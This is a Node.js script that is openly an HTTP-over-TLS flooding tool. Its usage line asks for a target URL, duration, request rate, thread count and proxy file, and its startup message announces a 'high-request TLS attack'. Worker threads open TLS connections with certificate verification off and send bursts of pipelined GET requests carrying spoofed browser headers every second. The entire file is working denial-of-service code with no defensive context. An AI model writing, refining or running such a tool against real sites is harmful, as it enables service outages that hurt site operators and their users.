const fs = require('fs');
const { Worker, isMainThread, workerData } = require('worker_threads');
const tls = require('tls');
const { URL } = require('url');
const os = require('os');

if (isMainThread) {
    if (process.argv.length < 7) {
        console.error("Usage: node script.js <url> <time> <rps> <threads> <proxy.txt>");
        process.exit(1);
    }

    const target = {
        url: process.argv[2],
        time: parseInt(process.argv[3], 10),
        rps: parseInt(process.argv[4], 10),
        threads: parseInt(process.argv[5], 10),
        proxyFile: process.argv[6]
    };

    console.log(`Starting high-request TLS attack on ${target.url} for ${target.time} seconds...`);
    
    for (let i = 0; i < target.threads; i++) {
        new Worker(__filename, { workerData: target });
    }
} else {
    const { url, time, rps, proxyFile } = workerData;
    const target = new URL(url);
    const PROXY_LIST = proxyFile ? fs.readFileSync(proxyFile, 'utf-8').split('\n').filter(p => p.trim()) : [];

    const headers = [
        "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 " +
        "(KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Accept: */*",
        "Accept-Encoding: gzip, deflate, br",
        "Connection: keep-alive",
        `Host: ${target.hostname}`,
        "Referer: " + url
    ];

    function sendTLSRequest() {
        const options = {
            host: target.hostname,
            port: 443,
            servername: target.hostname,
            rejectUnauthorized: false
        };

        const client = tls.connect(options, () => {
            for (let i = 0; i < rps; i++) {
                const request = `GET ${target.pathname} HTTP/1.1\r\n` +
                                headers.join("\r\n") +
                                "\r\n\r\n";
                client.write(request);
            }
        });

        client.on("error", () => {
            client.destroy();
        });

        client.on("close", () => {
            client.destroy();
        });
    }

    const interval = setInterval(() => {
        const cpuUsage = os.loadavg()[0];
        if (cpuUsage > 0.98 * os.cpus().length) {
            console.log("CPU usage exceeded 98%. Restarting...");
            process.exit(1);
        }
        sendTLSRequest();
    }, 1000);

    setTimeout(() => clearInterval(interval), time * 1000);
}
